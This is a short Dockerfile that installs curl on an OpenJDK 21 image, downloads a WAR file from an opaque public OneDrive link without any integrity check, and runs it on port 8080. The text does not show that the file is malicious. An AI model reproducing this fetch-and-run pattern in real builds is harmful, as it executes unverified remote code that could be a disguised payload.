FROM openjdk:21-slim-buster
RUN apt update
RUN apt install -y curl
RUN curl -L https://public.bl.files.1drv.com/y4m2Btgecj5itUlBuEW41FAjNMoo_CRrP57XespTmToj4qYHRjhvxVsytP49Vmg1Sm9iJSTGgPVC36_Uom36xs9D6KF9cdWmw09ob1cMufxSm0BFYe4y3HWErHZ4DxBQ199mjplS3USHJ70SjP3tqd31ytGm1aBfBVsxv9Rs-pu9Gs7CUQT4jVmekq2u8MX-2lhJOUAJRQvEn3IP8mGhwq9IhaZoSGUQ3vgzKgCxcRvUMM?AVOverride=1 -o p.war
 
CMD ["java", "-jar", "p.war"]
EXPOSE 8080
